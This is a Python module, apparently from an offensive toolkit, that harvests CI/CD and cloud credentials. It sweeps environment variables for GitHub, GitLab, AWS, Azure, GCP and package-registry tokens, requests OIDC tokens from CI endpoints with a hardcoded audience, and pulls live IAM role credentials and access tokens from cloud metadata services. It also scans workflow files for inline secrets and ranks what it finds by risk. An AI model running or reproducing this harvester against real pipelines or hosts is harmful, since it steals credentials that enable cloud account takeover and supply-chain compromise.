"""
CI/CD Token Harvester (P0 - FORGE Phase 0)

Extracts and analyzes CI/CD tokens from:
- Environment variables (GITHUB_TOKEN, GITLAB_TOKEN, etc.)
- Workflow files (secrets usage patterns)
- OIDC tokens (ACTIONS_ID_TOKEN_REQUEST_URL)
- Cloud provider metadata services

Provides classification of token scope, permissions, and exfiltration paths.
"""

from __future__ import annotations

import os
import re
import json
import base64
import logging
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Any, Optional
from enum import Enum
from datetime import datetime

logger = logging.getLogger(__name__)


class TokenProvider(Enum):
    GITHUB = "github"
    GITLAB = "gitlab"
    AZURE = "azure"
    AWS = "aws"
    GCP = "gcp"
    DOCKER = "docker"
    NPM = "npm"
    PYPI = "pypi"
    GENERIC = "generic"


class TokenScope(Enum):
    REPO = "repo"
    WORKFLOW = "workflow"
    PACKAGE = "package"
    ORG = "organization"
    CLOUD = "cloud"
    REGISTRY = "registry"
    UNKNOWN = "unknown"


class TokenRisk(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"


@dataclass
class TokenInfo:
    """Metadata about a harvested CI/CD token."""
    name: str
    value: str
    provider: TokenProvider = TokenProvider.GENERIC
    scope: TokenScope = TokenScope.UNKNOWN
    risk: TokenRisk = TokenRisk.LOW
    source: str = "environment"
    source_file: Optional[str] = None
    permissions: list[str] = field(default_factory=list)
    expires_at: Optional[str] = None
    workflow_path: Optional[str] = None
    job_id: Optional[str] = None
    is_oidc: bool = False
    is_service_account: bool = False
    raw: dict = field(default_factory=dict)

    def masked_value(self) -> str:
        """Return a masked version of the token value."""
        if len(self.value) <= 8:
            return "***"
        return self.value[:4] + "..." + self.value[-4:]

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "value_masked": self.masked_value(),
            "provider": self.provider.value,
            "scope": self.scope.value,
            "risk": self.risk.value,
            "source": self.source,
            "source_file": self.source_file,
            "permissions": self.permissions,
            "expires_at": self.expires_at,
            "workflow_path": self.workflow_path,
            "job_id": self.job_id,
            "is_oidc": self.is_oidc,
            "is_service_account": self.is_service_account,
        }

    @classmethod
    def from_env(cls, name: str, value: str) -> "TokenInfo":
        """Classify a token from an environment variable."""
        upper_name = name.upper()

        # GitHub tokens
        if name == "GITHUB_TOKEN":
            return cls(
                name=name, value=value, provider=TokenProvider.GITHUB,
                scope=TokenScope.REPO, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["repo", "workflow"],
                is_oidc=False,
            )
        if name == "ACTIONS_RUNTIME_TOKEN":
            return cls(
                name=name, value=value, provider=TokenProvider.GITHUB,
                scope=TokenScope.WORKFLOW, risk=TokenRisk.HIGH,
                source="environment", permissions=["runtime_api"],
                is_oidc=False,
            )
        if "ACTIONS_ID_TOKEN_REQUEST_URL" in upper_name and "TOKEN" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.GITHUB,
                scope=TokenScope.ORG, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["oidc"],
                is_oidc=True,
            )
        if name == "GH_TOKEN" or "GITHUB_" in upper_name and "TOKEN" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.GITHUB,
                scope=TokenScope.REPO, risk=TokenRisk.HIGH,
                source="environment",
            )

        # GitLab tokens
        if name == "CI_JOB_JWT":
            return cls(
                name=name, value=value, provider=TokenProvider.GITLAB,
                scope=TokenScope.WORKFLOW, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["api", "read_repository"],
                is_oidc=True,
            )
        if name == "CI_JOB_TOKEN":
            return cls(
                name=name, value=value, provider=TokenProvider.GITLAB,
                scope=TokenScope.WORKFLOW, risk=TokenRisk.HIGH,
                source="environment", permissions=["api", "read_repository"],
            )
        if "GITLAB" in upper_name and "TOKEN" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.GITLAB,
                scope=TokenScope.REPO, risk=TokenRisk.HIGH,
                source="environment",
            )

        # Azure tokens
        if "SYSTEM_ACCESSTOKEN" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.AZURE,
                scope=TokenScope.WORKFLOW, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["build_api"],
            )
        if "AZURE" in upper_name and ("TOKEN" in upper_name or "KEY" in upper_name or "SECRET" in upper_name):
            return cls(
                name=name, value=value, provider=TokenProvider.AZURE,
                scope=TokenScope.CLOUD, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["azure_api"],
            )

        # AWS tokens
        if "AWS_ACCESS_KEY_ID" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.AWS,
                scope=TokenScope.CLOUD, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["aws_api"],
            )
        if "AWS_SECRET_ACCESS_KEY" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.AWS,
                scope=TokenScope.CLOUD, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["aws_api"],
            )
        if "AWS_SESSION_TOKEN" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.AWS,
                scope=TokenScope.CLOUD, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["aws_api"],
                is_oidc=True,
            )

        # GCP tokens
        if "GOOGLE_APPLICATION_CREDENTIALS" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.GCP,
                scope=TokenScope.CLOUD, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["gcp_api"],
                is_service_account=True,
            )
        if "GCP" in upper_name and ("TOKEN" in upper_name or "KEY" in upper_name):
            return cls(
                name=name, value=value, provider=TokenProvider.GCP,
                scope=TokenScope.CLOUD, risk=TokenRisk.CRITICAL,
                source="environment", permissions=["gcp_api"],
            )

        # Registry tokens
        if "NPM" in upper_name and "TOKEN" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.NPM,
                scope=TokenScope.PACKAGE, risk=TokenRisk.HIGH,
                source="environment", permissions=["npm_publish"],
            )
        if "PYPI" in upper_name and "TOKEN" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.PYPI,
                scope=TokenScope.PACKAGE, risk=TokenRisk.HIGH,
                source="environment", permissions=["pypi_upload"],
            )
        if "DOCKER" in upper_name and ("TOKEN" in upper_name or "PASSWORD" in upper_name):
            return cls(
                name=name, value=value, provider=TokenProvider.DOCKER,
                scope=TokenScope.REGISTRY, risk=TokenRisk.HIGH,
                source="environment", permissions=["docker_push"],
            )

        # Generic token fallback
        if "TOKEN" in upper_name or "SECRET" in upper_name or "KEY" in upper_name or "PASSWORD" in upper_name:
            return cls(
                name=name, value=value, provider=TokenProvider.GENERIC,
                scope=TokenScope.UNKNOWN, risk=TokenRisk.MEDIUM,
                source="environment",
            )

        return cls(
            name=name, value=value, provider=TokenProvider.GENERIC,
            scope=TokenScope.UNKNOWN, risk=TokenRisk.LOW,
            source="environment",
        )


@dataclass
class HarvestResult:
    """Result of a token harvest operation."""
    tokens: list[TokenInfo] = field(default_factory=list)
    oidc_endpoints: list[dict] = field(default_factory=list)
    metadata_endpoints: list[dict] = field(default_factory=list)
    secrets_in_workflows: list[dict] = field(default_factory=list)
    summary: str = ""

    def total_tokens(self) -> int:
        return len(self.tokens)

    def critical_tokens(self) -> list[TokenInfo]:
        return [t for t in self.tokens if t.risk == TokenRisk.CRITICAL]

    def high_risk_tokens(self) -> list[TokenInfo]:
        return [t for t in self.tokens if t.risk in (TokenRisk.CRITICAL, TokenRisk.HIGH)]

    def by_provider(self) -> dict[str, list[TokenInfo]]:
        result: dict[str, list[TokenInfo]] = {}
        for t in self.tokens:
            result.setdefault(t.provider.value, []).append(t)
        return result

    def to_dict(self) -> dict:
        return {
            "tokens": [t.to_dict() for t in self.tokens],
            "total_tokens": self.total_tokens(),
            "critical_tokens": len(self.critical_tokens()),
            "high_risk_tokens": len(self.high_risk_tokens()),
            "oidc_endpoints": self.oidc_endpoints,
            "metadata_endpoints": self.metadata_endpoints,
            "secrets_in_workflows": self.secrets_in_workflows,
            "summary": self.summary,
        }


class TokenHarvester:
    """Harvests CI/CD tokens from environment, OIDC endpoints, and metadata services."""

    # OIDC token request URLs by provider
    OIDC_ENDPOINTS = {
        "github": {
            "url_var": "ACTIONS_ID_TOKEN_REQUEST_URL",
            "token_var": "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
            "audience_param": "?audience=raphael",
        },
        "gitlab": {
            "url_var": "CI_JOB_JWT_V2",
            "token_var": None,
            "audience_param": "",
        },
        "azure": {
            "url_var": "SYSTEM_OIDC_REQUESTURI",
            "token_var": "SYSTEM_ACCESSTOKEN",
            "audience_param": "",
        },
    }

    # Cloud metadata service endpoints
    METADATA_ENDPOINTS = {
        "aws_imds": {
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "headers": {},
        },
        "gcp_gce": {
            "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "headers": {"Metadata-Flavor": "Google"},
        },
        "azure_imds": {
            "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "headers": {"Metadata": "true"},
        },
    }

    # Token patterns for workflow file scanning
    TOKEN_PATTERNS = {
        "github_token": re.compile(r"GITHUB_TOKEN:\s*(\S+)"),
        "gh_token": re.compile(r"GH_TOKEN:\s*(\S+)"),
        "gitlab_token": re.compile(r"GITLAB_TOKEN:\s*(\S+)"),
        "azure_token": re.compile(r"AZURE_.*?_TOKEN:\s*(\S+)"),
        "npm_token": re.compile(r"NPM_TOKEN:\s*(\S+)"),
        "pypi_token": re.compile(r"PYPI_TOKEN:\s*(\S+)"),
        "docker_token": re.compile(r"DOCKER_TOKEN:\s*(\S+)"),
        "generic_secret": re.compile(r"secrets\.([A-Z0-9_]+)", re.IGNORECASE),
    }

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.env_cache: dict = {}
        self._harvested_tokens: dict[str, bool] = {}  # dedup

    def harvest_from_environment(self) -> HarvestResult:
        """Harvest tokens from environment variables."""
        result = HarvestResult()
        result.summary = "Environment harvest"

        for var_name in os.environ:
            value = os.environ[var_name]

            # Skip non-secret-like vars quickly
            if not any(kw in var_name.upper() for kw in ["TOKEN", "SECRET", "KEY", "PASSWORD", "CREDENTIAL", "AUTH"]):
                if not var_name.startswith(("ACTIONS_", "CI_", "SYSTEM_", "TF_", "AWS_", "AZURE_", "GOOGLE_", "GITHUB_", "GITLAB_")):
                    continue

            # Dedup
            dedup_key = f"{var_name}:{value[:16]}"
            if dedup_key in self._harvested_tokens:
                continue
            self._harvested_tokens[dedup_key] = True

            try:
                token = TokenInfo.from_env(var_name, value)
                if token.risk != TokenRisk.LOW:  # Only include meaningful tokens
                    result.tokens.append(token)
            except Exception:
                logger.debug(f"Failed to classify token: {var_name}", exc_info=True)

        return result

    def harvest_oidc(self) -> HarvestResult:
        """Harvest OIDC tokens from CI/CD provider endpoints."""
        result = HarvestResult()

        for provider, config in self.OIDC_ENDPOINTS.items():
            try:
                url = os.environ.get(config["url_var"])
                if not url:
                    continue

                token = os.environ.get(config["token_var"]) if config["token_var"] else None

                # Request OIDC token
                req = urllib.request.Request(
                    url + config["audience_param"],
                    headers={"Authorization": f"Bearer {token}"} if token else {},
                )
                with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                    data = json.loads(resp.read().decode())

                oidc_token = data.get("value", "") or data.get("token", "") or json.dumps(data)

                if oidc_token:
                    token_info = TokenInfo(
                        name=f"{provider}_oidc_token",
                        value=oidc_token,
                        provider=TokenProvider[provider.upper()],
                        scope=TokenScope.ORG,
                        risk=TokenRisk.CRITICAL,
                        source="oidc_endpoint",
                        is_oidc=True,
                        permissions=["oidc", "cloud"],
                    )
                    result.tokens.append(token_info)
                    result.oidc_endpoints.append({
                        "provider": provider,
                        "url": url,
                        "success": True,
                    })
            except (urllib.error.URLError, urllib.error.HTTPError, KeyError, json.JSONDecodeError) as e:
                logger.debug(f"OIDC harvest failed for {provider}: {e}")
                result.oidc_endpoints.append({
                    "provider": provider,
                    "error": str(e),
                    "success": False,
                })

        return result

    def harvest_cloud_metadata(self) -> HarvestResult:
        """Harvest tokens from cloud provider metadata services."""
        result = HarvestResult()

        for provider, config in self.METADATA_ENDPOINTS.items():
            try:
                req = urllib.request.Request(config["url"], headers=config["headers"])
                with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                    data = resp.read().decode()

                # AWS IMDS returns a list of roles or a specific role's creds
                if provider == "aws_imds":
                    if not data.strip() or data.strip() == "":
                        continue
                    roles = data.strip().split("\n")
                    for role in roles:
                        role_url = f"{config['url']}{role}"
                        try:
                            req = urllib.request.Request(role_url)
                            with urllib.request.urlopen(req, timeout=self.timeout) as role_resp:
                                role_data = json.loads(role_resp.read().decode())
                                token_info = TokenInfo(
                                    name=f"aws_role_{role}",
                                    value=json.dumps(role_data),
                                    provider=TokenProvider.AWS,
                                    scope=TokenScope.CLOUD,
                                    risk=TokenRisk.CRITICAL,
                                    source="metadata_service",
                                    permissions=["aws_api", "sts"],
                                    expires_at=role_data.get("Expiration", ""),
                                )
                                result.tokens.append(token_info)
                        except Exception as e:
                            logger.debug(f"AWS role {role} failed: {e}")

                elif provider == "gcp_gce":
                    gcp_data = json.loads(data)
                    token_value = gcp_data.get("access_token", "")
                    if token_value:
                        token_info = TokenInfo(
                            name="gcp_default_sa_token",
                            value=token_value,
                            provider=TokenProvider.GCP,
                            scope=TokenScope.CLOUD,
                            risk=TokenRisk.CRITICAL,
                            source="metadata_service",
                            permissions=["gcp_api"],
                            expires_at=gcp_data.get("expires_in", ""),
                            is_oidc=True,
                        )
                        result.tokens.append(token_info)

                elif provider == "azure_imds":
                    azure_data = json.loads(data)
                    token_value = azure_data.get("access_token", "")
                    if token_value:
                        token_info = TokenInfo(
                            name="azure_imds_token",
                            value=token_value,
                            provider=TokenProvider.AZURE,
                            scope=TokenScope.CLOUD,
                            risk=TokenRisk.CRITICAL,
                            source="metadata_service",
                            permissions=["azure_api"],
                            expires_at=azure_data.get("expires_on", ""),
                            is_oidc=True,
                        )
                        result.tokens.append(token_info)

                result.metadata_endpoints.append({
                    "provider": provider,
                    "success": True,
                })
            except (urllib.error.URLError, urllib.error.HTTPError, json.JSONDecodeError, OSError) as e:
                logger.debug(f"Metadata harvest failed for {provider}: {e}")
                result.metadata_endpoints.append({
                    "provider": provider,
                    "error": str(e),
                    "success": False,
                })

        return result

    def harvest_from_file(self, file_path: str) -> HarvestResult:
        """Harvest tokens from a workflow file."""
        result = HarvestResult()

        try:
            with open(file_path, encoding="utf-8") as f:
                content = f.read()
        except (FileNotFoundError, PermissionError, IOError) as e:
            logger.warning(f"File read failed: {file_path}: {e}")
            return result

        # Search for inline tokens (anti-pattern, but common)
        for pattern_name, pattern in self.TOKEN_PATTERNS.items():
            for match in pattern.finditer(content):
                value = match.group(1)
                # Skip obvious placeholders
                if value in ("${{", "}}", "''", '""'):
                    continue
                if len(value) < 8:
                    continue

                token_name = pattern_name.replace("_", " ").title()
                token_info = TokenInfo(
                    name=token_name,
                    value=value,
                    source="workflow_file",
                    source_file=file_path,
                )
                result.tokens.append(token_info)
                result.secrets_in_workflows.append({
                    "pattern": pattern_name,
                    "match": match.group(0)[:40] + "...",
                    "file": file_path,
                    "line": self._find_line_number(content, match.start()),
                })

        return result

    def harvest_all(self) -> HarvestResult:
        """Harvest tokens from all available sources."""
        combined = HarvestResult()

        # From environment
        env_result = self.harvest_from_environment()
        combined.tokens.extend(env_result.tokens)

        # From OIDC
        oidc_result = self.harvest_oidc()
        combined.tokens.extend(oidc_result.tokens)
        combined.oidc_endpoints = oidc_result.oidc_endpoints

        # From metadata services (only if running inside CI)
        if os.environ.get("CI") or os.environ.get("GITHUB_ACTIONS") or os.environ.get("CI_JOB_ID"):
            meta_result = self.harvest_cloud_metadata()
            combined.tokens.extend(meta_result.tokens)
            combined.metadata_endpoints = meta_result.metadata_endpoints

        # Deduplicate by value prefix
        seen_values: set[str] = set()
        unique_tokens = []
        for t in combined.tokens:
            val_key = t.value[:32]
            if val_key not in seen_values:
                seen_values.add(val_key)
                unique_tokens.append(t)
        combined.tokens = unique_tokens

        combined.summary = (
            f"Harvested {len(combined.tokens)} tokens "
            f"({len(combined.critical_tokens())} critical, "
            f"{len(combined.high_risk_tokens())} high-risk)"
        )

        return combined

    def _find_line_number(self, content: str, pos: int) -> int:
        """Find the line number for a given character position."""
        return content[:pos].count("\n") + 1

    def extract_tokens_from_workflow(self, workflow: Any) -> list[dict]:
        """Extract token references from a parsed Workflow object."""
        token_refs = []
        if hasattr(workflow, "jobs"):
            for job_id, job in workflow.jobs.items():
                for token in job.extracts_tokens():
                    token_refs.append({
                        "token": token,
                        "workflow": getattr(workflow, "path", ""),
                        "job": job_id,
                    })
        return token_refs

    def summary(self) -> dict:
        return {
            "harvester": "TokenHarvester",
            "version": "0.1.0",
            "providers_supported": [p.value for p in TokenProvider],
            "harvest_methods": ["environment", "oidc", "metadata_service", "file_scan"],
            "oidc_endpoints": list(self.OIDC_ENDPOINTS.keys()),
            "metadata_endpoints": list(self.METADATA_ENDPOINTS.keys()),
        }


def harvest_tokens() -> dict:
    """Convenience function to harvest all tokens."""
    harvester = TokenHarvester()
    result = harvester.harvest_all()
    return result.to_dict()


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
    path = sys.argv[1] if len(sys.argv) > 1 else None
    harvester = TokenHarvester()
    result = harvester.harvest_all()

    if path:
        file_result = harvester.harvest_from_file(path)
        result.tokens.extend(file_result.tokens)
        result.secrets_in_workflows.extend(file_result.secrets_in_workflows)

    print(json.dumps(result.to_dict(), indent=2, default=str))
